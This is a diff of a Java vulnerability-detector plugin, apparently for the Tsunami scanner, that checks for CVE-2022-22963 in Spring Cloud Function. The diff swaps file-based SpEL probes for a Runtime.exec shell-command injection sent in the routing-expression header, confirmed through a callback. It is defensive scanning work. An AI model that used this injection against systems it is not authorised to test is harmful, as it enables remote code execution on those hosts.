@@ -23,22 +23,23 @@ import static com.google.tsunami.common.net.http.HttpRequest.post;
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
-import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.HttpClient;
 import com.google.tsunami.common.net.http.HttpHeaders;
 import com.google.tsunami.common.net.http.HttpRequest;
 import com.google.tsunami.common.net.http.HttpResponse;
-import com.google.tsunami.common.net.http.HttpStatus;
 import com.google.tsunami.common.time.UtcClock;
 import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
+import com.google.tsunami.plugin.payload.Payload;
+import com.google.tsunami.plugin.payload.PayloadGenerator;
 import com.google.tsunami.proto.DetectionReport;
 import com.google.tsunami.proto.DetectionReportList;
 import com.google.tsunami.proto.DetectionStatus;
 import com.google.tsunami.proto.NetworkService;
+import com.google.tsunami.proto.PayloadGeneratorConfig;
 import com.google.tsunami.proto.Severity;
 import com.google.tsunami.proto.TargetInfo;
 import com.google.tsunami.proto.Vulnerability;
@@ -60,12 +61,6 @@ public final class Cve202222963VulnDetector implements VulnDetector {
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
   private static final String CHECK_VUL_PATH = "functionRouter";
   private static final String VULN_HEADER = "spring.cloud.function.routing-expression";
-  private static final String CREATE_FILE_EL = "T(java.nio.file.Files).write(T(java.nio.file.Paths)"
-      + ".get(\"/tmp/test-function-name.txt\"), new String(\"uppercase\").getBytes())";
-  private static final String CHECK_EL = "new java.lang.String(T(java.nio.file.Files)"
-      + ".readAllBytes(T(java.nio.file.Paths).get(\"/tmp/test-function-name.txt\")))";
-  private static final String DELETE_FILE_EL = "T(java.nio.file.Files)"
-      + ".deleteIfExists(T(java.nio.file.Paths).get(\"/tmp/test-function-name.txt\"))";
 
   @VisibleForTesting
   static final String VULN_DESCRIPTION =
@@ -73,16 +68,17 @@ public final class Cve202222963VulnDetector implements VulnDetector {
           + "when using routing functionality it is possible for a user to provide a "
           + "specially crafted SpEL as a routing-expression that may result in remote "
           + "code execution and access to local resources.";
-  @VisibleForTesting
-  static final String CHECK_PAYLOAD = "check";
 
   private final HttpClient httpClient;
   private final Clock utcClock;
+  private final PayloadGenerator payloadGenerator;
 
   @Inject
-  Cve202222963VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
+  Cve202222963VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient,
+      PayloadGenerator payloadGenerator) {
     this.httpClient = checkNotNull(httpClient);
     this.utcClock = checkNotNull(utcClock);
+    this.payloadGenerator = checkNotNull(payloadGenerator);
   }
 
   private static boolean isWebServiceOrUnknownService(NetworkService networkService) {
@@ -106,50 +102,31 @@ public final class Cve202222963VulnDetector implements VulnDetector {
   }
 
   private boolean isServiceVulnerable(NetworkService networkService) {
-    createFunctionFile(networkService);
-    if (checkFunctionFile(networkService))
-      return true;
-    deleteFunctionFile(networkService);
-    return false;
-  }
-
-  private void createFunctionFile(NetworkService networkService) {
-    String targetUri = buildTargetUrl(networkService);
-    HttpRequest httpRequest = post(targetUri).setHeaders(
-        HttpHeaders.builder().addHeader(VULN_HEADER, CREATE_FILE_EL).build()
-    ).setRequestBody(ByteString.copyFromUtf8(CHECK_PAYLOAD)).build();
-    try {
-      httpClient.send(httpRequest, networkService);
-    } catch (IOException e) {
-      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
+    PayloadGeneratorConfig config =
+        PayloadGeneratorConfig.newBuilder()
+            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
+            .setInterpretationEnvironment(
+                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
+            .setExecutionEnvironment(
+                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
+            .build();
+    Payload payload = this.payloadGenerator.generate(config);
+    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
+      return false;
     }
-  }
-
-  private boolean checkFunctionFile(NetworkService networkService) {
+    String commandToInject = String.format("T(java.lang.Runtime).getRuntime().exec("
+            + "new java.lang.String[]{\"sh\",\"-c\",\"%s\"})", payload.getPayload());
     String targetUri = buildTargetUrl(networkService);
     HttpRequest httpRequest = post(targetUri).setHeaders(
-        HttpHeaders.builder().addHeader(VULN_HEADER, CHECK_EL).build()
-    ).setRequestBody(ByteString.copyFromUtf8(CHECK_PAYLOAD)).build();
+        HttpHeaders.builder().addHeader(VULN_HEADER, commandToInject).build()
+    ).build();
     try {
-      HttpResponse response = httpClient.send(httpRequest, networkService);
-      if (response.status() == HttpStatus.OK && response.bodyString().isPresent())
-        return response.bodyString().get().equals(CHECK_PAYLOAD.toUpperCase());
+      HttpResponse res = httpClient.send(httpRequest, networkService);
+      return payload.checkIfExecuted(res.bodyBytes());
     } catch (IOException e) {
       logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
     }
     return false;
-  }
-
-  private void deleteFunctionFile(NetworkService networkService) {
-    String targetUri = buildTargetUrl(networkService);
-    HttpRequest httpRequest = post(targetUri).setHeaders(
-        HttpHeaders.builder().addHeader(VULN_HEADER, DELETE_FILE_EL).build()
-    ).setRequestBody(ByteString.copyFromUtf8(CHECK_PAYLOAD)).build();
-    try {
-      httpClient.send(httpRequest, networkService);
-    } catch (IOException e) {
-      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
-    }
   }
 
   private static String buildTargetUrl(NetworkService networkService) {
